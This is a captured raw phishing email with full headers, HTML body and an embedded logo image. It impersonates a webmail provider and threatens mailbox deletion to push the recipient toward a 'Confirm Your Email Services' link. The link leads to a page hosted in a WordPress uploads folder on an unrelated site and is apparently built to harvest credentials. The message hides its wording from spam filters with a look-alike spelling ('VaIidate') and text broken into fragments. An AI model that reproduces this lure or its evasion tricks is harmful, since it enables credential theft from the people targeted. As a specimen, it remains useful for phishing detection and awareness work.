@@ -1,0 +1,461 @@
+Return-Path: admine@slwilliarnson.com
+Delivered-To: jose@monkey.org
+X-FDA: 81357820656.14.3CBCFD2
+Received: from mta0.slwilliarnson.com (temporalxdoo.libertyheadline.com [79.141.165.233])
+	by imf21.b.hostedemail.com (Postfix) with ESMTP id BF6ED180002
+	for <jose@monkey.org>; Wed, 18 Oct 2023 07:54:46 +0000 (UTC)
+Authentication-Results: imf21.b.hostedemail.com;
+	dkim=pass header.d=slwilliarnson.com header.s=default header.b=NZ2JiKhF;
+	spf=none (imf21.b.hostedemail.com: domain of admine@slwilliarnson.com has no SPF policy when checking 79.141.165.233) smtp.mailfrom=admine@slwilliarnson.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1697615687; a=rsa-sha256;
+	cv=none;
+	b=PrITXhni5/+N4c6eo4QvDUphOzZBYOJTFlci7j02SKmZyteHjFZZ6HbD2j14vdiXGa3Bj/
+	BqZyoFKXpKmqxBWEzkUpn92HwqxmxEI6FKuruMfh4rgj2J0ajY7nkLYLTwcx7pOJKlnMoO
+	yr7ONSXfL6OK8uo/E98te83zx7StOAI=
+ARC-Authentication-Results: i=1;
+	imf21.b.hostedemail.com;
+	dkim=pass header.d=slwilliarnson.com header.s=default header.b=NZ2JiKhF;
+	spf=none (imf21.b.hostedemail.com: domain of admine@slwilliarnson.com has no SPF policy when checking 79.141.165.233) smtp.mailfrom=admine@slwilliarnson.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1697615687;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=3RWXLnsSYSYxw9+9svMgQYJHy8PcEhcuQxVc49fkrvU=;
+	b=p5noeI30WtoOweGVBvFD/wVjdHXtWYrJIdMpXiyoMUwz6oovOOTtsZy2i+Wo8jAKfMsLSR
+	w3Djla3rjbcFaCwlusTEJyVBBwCZAnEqa/PSpQ26Ab2BbDPJMxSFKs0rI3qTE4xsEZ46aS
+	YH8kYl9iaj5CgH4LSp0XKTW+ADnbMB8=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=slwilliarnson.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=admine@slwilliarnson.com;
+ bh=3RWXLnsSYSYxw9+9svMgQYJHy8PcEhcuQxVc49fkrvU=;
+ b=NZ2JiKhFIoA6erbLRQyukOEHWYpil6wxzxM4B9z73Cg/un9ODqnzxJ7lwWRFdkPOw/9VjncQuk+m
+   PHhV3vB3Sep1kk/n6n5NWRPzGBdctNU/au/lsry2tkP6amOYOSQOgDOQe30gAJhQcUGAXTiJcS/y
+   kwsois9DuwBsGsoiaoo=
+From: Webmail Account Team <admine@slwilliarnson.com>
+To: jose@monkey.org
+Subject: To avoid service interruption your attention is needed.
+Date: 18 Oct 2023 07:54:44 +0000
+Message-ID: <20231018075444.2640BF4EA79ABB64@slwilliarnson.com>
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_4222994C.1B3804DB"
+X-Rspamd-Server: rspam01
+X-Rspam-User: 
+X-Spam-Status: No, score=2.70
+X-Stat-Signature: ne1s37r5aeeu6iyt64faro81yxws57th
+X-Rspamd-Queue-Id: BF6ED180002
+X-HE-Tag: 1697615686-640897
+X-HE-Meta: U2FsdGVkX19fCTqaUnkyQoXJ5ANuVOElb1LPvxkjG8gaiRF6xUAGWCQawBkuURqqix0RNePOlsEAvKvHUec1lg28F8UNMMGNZIldEF4rqMgK0ZFuBZnUEqfpqyVt33peYPQDREOc5ybicLkPKpVgDlIw/ShA8AR8VSR+gY92NkPu3zaxVEWhZ/f4uoYoF5o9Ae9R65mDgQuFlD4AR2naMxiJWKu0ishAXBR1YDTCJYw=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 318
+
+
+------=_NextPart_000_0012_4222994C.1B3804DB
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body><BR class=3Dgmail-Apple-interchange-newline>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: &quot=
+;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;=
+ WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TR=
+ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; =
+TEXT-ALIGN: left; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(238,241,248=
+); font-variant-ligatures: normal; font-variant-caps: normal; text-decorati=
+on-thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
+=3D"100%" align=3D"center" bgcolor=3D"#eeeeee" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-LEFT: 8px; MARGIN: 0px; PADDIN=
+G-RIGHT: 8px" bgcolor=3D"#eeeeee" valign=3D"top" width=3D"100%">
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 1px; MARGIN: 0px" height=3D=
+"8">&nbsp;</TD></TR></TBODY></TABLE>
+<table style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(254,210,90) 1px sol=
+id; BORDER-RIGHT: rgb(254,210,90) 1px solid; BORDER-COLLAPSE: collapse; BOR=
+DER-BOTTOM: rgb(254,210,90) 1px solid; PADDING-BOTTOM: 10px; PADDING-TOP: 1=
+0px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(254,210,90) 1px solid; PADDING-RI=
+GHT: 10px; BACKGROUND-COLOR: rgb(255,240,206)" cellspacing=3D"0" cellpaddin=
+g=3D"1" width=3D"600" align=3D"center" bgcolor=3D"#fff0ce" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; COLOR: rgb(27,39,71); PADDING-BOTTOM: =
+5px; PADDING-TOP: 5px; PADDING-LEFT: 10px; MARGIN: 0px; LINE-HEIGHT: 14px; =
+PADDING-RIGHT: 10px"><FONT style=3D"BOX-SIZING: border-box" size=3D1>For se=
+curity precautions, check and make sure you&nbsp;always review&nbsp;your em=
+ail security activities!!!</FONT></TD></TR></TBODY></TABLE>
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 1px; MARGIN: 0px" height=3D=
+"8">&nbsp;<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: bor=
+der-box"></TD></TR></TBODY></TABLE>
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"1" width=3D"600" align=3D"center" bgcolor=3D"#eeee=
+ee" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; MARGIN: 0px" width=3D"198">&nbsp;&nbsp=
+;&nbsp;&nbsp;</TD>
+<td style=3D"BOX-SIZING: border-box; TEXT-ALIGN: right; MARGIN: 0px">
+<H3 style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-WEIGHT: normal; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE=
+-HEIGHT: 1.2; PADDING-RIGHT: 0px"></H3><BR></TD></TR></TBODY></TABLE>
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 1px; MARGIN: 0px" height=3D=
+"8">&nbsp;</TD></TR></TBODY></TABLE>
+<table style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(221,221,221) 1px so=
+lid; BORDER-RIGHT: rgb(221,221,221) 1px solid; BORDER-COLLAPSE: collapse; B=
+ORDER-BOTTOM: rgb(221,221,221) 1px solid; PADDING-BOTTOM: 10px; PADDING-TOP=
+: 10px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(221,221,221) 1px solid; PADDIN=
+G-RIGHT: 10px; BACKGROUND-COLOR: rgb(255,255,255)" cellspacing=3D"0" cellpa=
+dding=3D"1" width=3D"600" align=3D"center" bgcolor=3D"#ffffff" border=3D"0"=
+>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"><img style=3D"HEIG=
+HT: 16px; WIDTH: 99px" border=3D"0" hspace=3D"0" alt=3D"webmail thumb.png" =
+src=3D"cid:webmailthumb.png" width=3D"553" height=3D"91"><BR>&#8203;<SPAN>&=
+nbsp;</SPAN>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp; <BR style=3D"BOX-SIZING:=20
+border-box"><BR style=3D"BOX-SIZING: border-box">
+<table style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, Helvetica, sans=
+-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; =
+TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: n=
+ormal; LETTER-SPACING: normal; font-variant-ligatures: normal; font-variant=
+-caps: normal; text-decoration-thickness: initial; text-decoration-style: i=
+nitial; text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0"=
+ width=3D"100%" align=3D"center">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, &quot;=
+Open Sans&quot;; BORDER-COLLAPSE: collapse; MARGIN: 0px; LINE-HEIGHT: 1" va=
+lign=3D"top" align=3D"left"><SPAN style=3D"BOX-SIZING: border-box; BORDER-C=
+OLLAPSE: collapse; COLOR: rgb(74,74,74); LINE-HEIGHT: 32px"><FONT style=3D"=
+BOX-SIZING: border-box" size=3D2><STRONG style=3D"BOX-SIZING: border-box; F=
+ONT-WEIGHT: bolder">Final Notice:<SPAN>&nbsp;</SPAN></STRONG>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 32px; BORDER-COLLAPSE: co=
+llapse; FONT-WEIGHT: bold; COLOR: rgb(74,74,74); LINE-HEIGHT: 32px"><FONT s=
+tyle=3D"BOX-SIZING: border-box" size=3D2><SPAN class=3D"LI ng" aria-invalid=
+=3Dspelling data-ddnwab=3D"PR_3_0" zeum4c50=3D"PR_3_0">VaIidate</SPAN> your=
+ account services.</FONT></SPAN></FONT></SPAN></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse; MARGIN: 0px=
+" width=3D"20"><FONT style=3D"BOX-SIZING: border-box" size=3D2></FONT><BR><=
+/TD></TR></TBODY></TABLE><BR style=3D"BOX-SIZING: border-box"><FONT style=
+=3D"BOX-SIZING: border-box" size=3D1>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: none; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; DIS=
+PLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial'>Hi jose,</SPAN>
+<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><=
+/FONT><FONT style=3D"BOX-SIZING: border-box" color=3D#666666 face=3DArial>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>As</FONT></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>&nbsp;p</FONT></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>ar</FONT></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>t&nbsp;</FONT></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>of</FONT></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>&nbsp;t</FONT></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: left; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial'>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>he</FONT></SPAN><FONT style=
+=3D"BOX-SIZING: border-box" size=3D1>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: none; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; DIS=
+PLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial'>
+&nbsp;Webmail&nbsp;plan in serving you better is to guarantee you adequate =
+solutions to your tasks and providing convenient service to our customers. =
+We will need to verify if&nbsp;the&nbsp;email service</SPAN><SPAN>&nbsp;</S=
+PAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: none; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; DIS=
+PLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial'>
+&nbsp;is owned by you ?.<SPAN>&nbsp;</SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: none; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; DIS=
+PLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial'>
+If you fail to Validate your services, some of the associated services - li=
+ke email boxes - will also be deleted.</SPAN></SPAN></FONT></FONT>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-FAMILY: Arial, sans-serif, "Ope=
+n Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOA=
+T: none; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-STYLE: normal; DIS=
+PLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial'>
+<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><=
+/SPAN><BR style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: borde=
+r-box" size=3D1></FONT>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; WIDTH: 557px; BORD=
+ER-COLLAPSE: collapse; COLOR: rgb(85,85,85)">
+<THEAD style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(208,234,255) 1px solid=
+; BORDER-BOTTOM: rgb(208,234,255) 1px solid; COLOR: rgb(35,87,137); BACKGRO=
+UND-COLOR: rgb(244,250,255)">
+<TH style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; PADDING-RIGHT: 10px"><FONT style=3D"BOX-SIZING: bord=
+er-box" size=3D1>Account&nbsp;number</FONT></TH>
+<TH style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; PADDING-RIGHT: 10px"><FONT style=3D"BOX-SIZING: bord=
+er-box" size=3D1>Website</FONT></TH>
+<TH style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; PADDING-RIGHT: 10px"><FONT style=3D"BOX-SIZING: bord=
+er-box" size=3D1>Email Holder</FONT></TH>
+<TH style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; PADDING-RIGHT: 10px"><FONT style=3D"BOX-SIZING: bord=
+er-box" size=3D1>&nbsp;Validation date</FONT></TH></TR></THEAD>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(221,221,221) 1px so=
+lid; BACKGROUND-COLOR: rgb(248,248,248)">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"><FONT style=3D"BOX=
+-SIZING: border-box" size=3D1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 24=
+23946966</FONT></TD>
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"><FONT style=3D"BOX=
+-SIZING: border-box" size=3D1>&nbsp;monkey.org</FONT></TD>
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"><FONT style=3D"BOX=
+-SIZING: border-box" size=3D1>&nbsp;&nbsp;&nbsp;&nbsp; jose@monkey.org</FON=
+T></TD>
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
+x; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"><FONT style=3D"BOX=
+-SIZING: border-box" size=3D1>10/18/2023 7:54:44 a.m.</FONT></TD></TR></TBO=
+DY></TABLE><BR style=3D"BOX-SIZING: border-box">
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Arial,=
+ sans-serif, "Open Sans"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRAN=
+SFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(102,102,102); FONT-S=
+TYLE: normal; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rg=
+b(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; text-decoration-thickness: initial; text-decoration-style=
+: initial; text-decoration-color: initial'>
+<BR style=3D"BOX-SIZING: border-box"><U style=3D"BOX-SIZING: border-box"><A=
+ style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(0,172,2=
+55); BACKGROUND-COLOR: transparent" href=3D"https://dgps.bewireless-solutio=
+ns.com/wp-content/uploads/js_composer/Resistance/webma/#jose@monkey.org" re=
+l=3Dnoreferrer target=3D_blank><FONT style=3D"BOX-SIZING: border-box" size=
+=3D1>Confirm Your&nbsp; Email Services.</FONT></A><BR style=3D"BOX-SIZING: =
+border-box"><BR style=3D"BOX-SIZING: border-box"></U></SPAN>
+<FONT style=3D"BOX-SIZING: border-box" size=3D1>This is a regular check tha=
+t happens after an update on our Webmail system has been finalized,it is co=
+mpulsory that you confirm your credentials are up to date to prevent interr=
+uption when sending and receiving messages in your daily usage and avoid ge=
+tting locked out of your mailbox frequently.<BR style=3D"BOX-SIZING: border=
+-box"><BR style=3D"BOX-SIZING: border-box">Best wishes,<BR style=3D"BOX-SIZ=
+ING: border-box">Webmail.com Customer Service Team</FONT>
+</TD></TR></TBODY></TABLE><FONT style=3D"BOX-SIZING: border-box" size=3D1><=
+/FONT>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; BORDER-COLLAPSE: c=
+ollapse; COLOR: rgb(102,102,102)" cellspacing=3D"0" cellpadding=3D"1" width=
+=3D"600" align=3D"center" bgcolor=3D"#eeeeee" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(221,221,221) 1px so=
+lid; PADDING-BOTTOM: 3px; TEXT-ALIGN: center; PADDING-TOP: 3px; PADDING-LEF=
+T: 3px; MARGIN: 0px; PADDING-RIGHT: 3px">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT style=3D"BOX-SIZ=
+ING: border-box" size=3D1>Please don't reply to this email.</FONT></P></TD>=
+</TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(221,221,221) 1px so=
+lid; PADDING-BOTTOM: 3px; TEXT-ALIGN: center; PADDING-TOP: 3px; PADDING-LEF=
+T: 3px; MARGIN: 0px; PADDING-RIGHT: 3px">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT style=3D"BOX-SIZ=
+ING: border-box" size=3D1>Copyright &copy; 1996&#8211;2023 Webmail.com B.V.=
+ All rights reserved.</FONT></P></TD></TR></TBODY></TABLE></TD></TR></TBODY=
+></TABLE></BODY></HTML>
+------=_NextPart_000_0012_4222994C.1B3804DB
+Content-Type: image/png; name="webmailthumb.png"
+Content-Transfer-Encoding: base64
+Content-ID: <webmailthumb.png>
+
+iVBORw0KGgoAAAANSUhEUgAAAisAAABbCAMAAACFzTXyAAAAkFBMVEX/bCz/////aSb/Zh//
+qo7/ZBj/YhL/aCP/XgD/YQ//ayn/hVn/18n/wrH/ZyL/4NX/hVX/lnD/z7//+vj/9fH/6eD/
+kWn/8+7/18r/7+n/y7r/3ND/x7X/vKb/3tP/pIX/i2D/p4n/cTP/nXr/fEf/spj/n33/gE7/
+r5X/v6r/eUL/mHT/t5//il3/cDH/dTu9T8RSAAAUi0lEQVR4nO1dbVujOhBFEAqsttXWam1d
+ba1W69v//3e3TQIFcs5ABPZ53L3na9EQMpnMnHmJd0Ixut95RexOJ/zhk+n79rP49PpiJDx9
+spyti09/PtxKT7fAg38cZHN/2dMoPxGj+01xCdLdanr8sbI+3nZ5cuLRf/UYD9PS42noTenT
+l0lQftobxGf06at15Jef9uPVd+Zbi0lQnMEwSvlL/WN4ttY38K7Nb/b6pPEbl5VZ6FkIZuzp
+29h+Ok3Y0/PYtx+Pb1pMnOImqc75pY9hfh5mkb0Ew7H+bZ6g9blksrJM7Kc9LyGKZYqfZnt4
+A17FGz62nT7CS1AdJ77rY5yfhiXY3PsV04oFr889k5V1Ch734jl++gkoIc8LiQ2ygO85oEqr
+DTb2POKrPgb6YdjB9U3U+pL1eSaycgUVRZqSkaEgeglZlJW11w8ITjv4BFVMwbT7EcqfhTkU
+hzRQP57i9XknsvIKFQX7ymhF8pFtYJ2V9GGvXIJT2Yuv6//wL8cSr++F+pHonBGRldkAPR6+
+4qfhiniDN/z0HOosL5Q88u/ieYhGWvYw0s/CG15f9WGu4WqmwwmRFSh29KSHK0KXBMu0/9DF
+N6gCqrBeTrufhSrBYdZXmSu3UFb264NlZYTNFZ+M7DkZwkSm+3BPsAoL7nsY6keBmKNf6key
+81+JrLxD62b47DTyjrwolixmCLfCOVRhwT9PsWBz1OyhT7zzr4isjKFfExGGnIy8wk9fuRnC
+rXABVRibx78DbI7q78LXB8rKBJsrjIkjIxMm7g6b4MQQbgd48noxD1X8IyCeqPIu8M4/MKVQ
